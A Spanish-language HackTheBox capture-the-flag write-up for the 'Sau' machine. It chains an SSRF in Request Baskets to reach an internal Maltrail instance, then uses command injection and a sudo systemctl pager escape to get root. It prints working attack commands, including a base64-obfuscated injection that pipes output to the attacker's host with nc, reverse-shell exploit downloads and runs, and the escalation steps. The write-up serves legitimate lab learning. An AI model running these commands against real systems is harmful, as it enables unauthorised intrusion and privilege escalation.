# Sau - HackTheBox

**Fecha de resolución:** 22 de septiembre de 2026

Máquina Linux, IP 10.129.229.26.

## Reconocimiento

Escaneo completo de puertos:

```
nmap -n -p- -sS -T5 10.129.229.26 -vvv -oG allports --min-rate 5000
```

Dos puertos abiertos: 22 (OpenSSH 8.2p1 Ubuntu) y 55555 (HTTP, Golang net/http). Escaneo de versión sobre ambos:

```
nmap 10.129.229.26 -p22,55555 -n -sV -sC -vvv -oN targets
```

El puerto 55555 redirige a `/web` y responde con "Request Baskets", una herramienta que crea cestas HTTP para inspeccionar y reenviar peticiones a otro destino. Probé `http-enum` de nmap y `whatweb` sobre ese puerto para buscar rutas adicionales, sin resultado:

```
nmap -sV --script=http-enum 10.129.229.26 -p 55555
nmap -p 55555 --script=http-enum --script-args http-enum.basepath=/web/ 10.129.229.26
whatweb http://10.129.229.26:55555/
```

## SSRF en Request Baskets (CVE-2023-27163)

Request Baskets en versiones <= 1.2.1 permite crear una cesta cuyo `forward_url` apunta a cualquier URL, incluyendo direcciones internas del propio host, lo que habilita SSRF hacia servicios que solo escuchan en localhost. Usé el PoC público de la CVE:

```
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1
```

El script crea una cesta que reenvía las peticiones hacia `127.0.0.1`. Consultando esa cesta quedó expuesto qué corre en el localhost del host, solo accesible desde dentro: una instancia de Maltrail v0.53.

## RCE en Maltrail v0.53

Maltrail v0.53 tiene una inyección de comandos no autenticada en el endpoint de login, a través del parámetro `username`, que se procesa sin sanitizar. Usando la cesta creada por el PoC como proxy hacia el Maltrail interno, probé la inyección directamente contra la ruta de la cesta:

```
curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;`echo aWQgfCBuYyAxMC4xMC4xNC4yMjQgNDQ0NA== | base64 -d | sh`'
```

Después usé el exploit público para automatizar el envío de una reverse shell:

```
wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
python3 exploit.py 10.10.14.224 4444 http://10.129.229.26:55555/bsmoel
```

Con un listener en escucha capturé conexión como `puma`:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.229.26] 49112
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

## Escalada a root

Con `sudo -l` como `puma` aparece esto:

```
User puma may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`systemctl status` abre la salida en el pager `less` cuando el terminal es interactivo, y ese `less` hereda los privilegios de root al ser hijo del `systemctl` lanzado con sudo. Desde el pager, escapar con `!sh` da una shell con esos privilegios heredados:

```
sudo /usr/bin/systemctl status trail.service
!sh
```

Shell de root obtenida y flag capturada.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
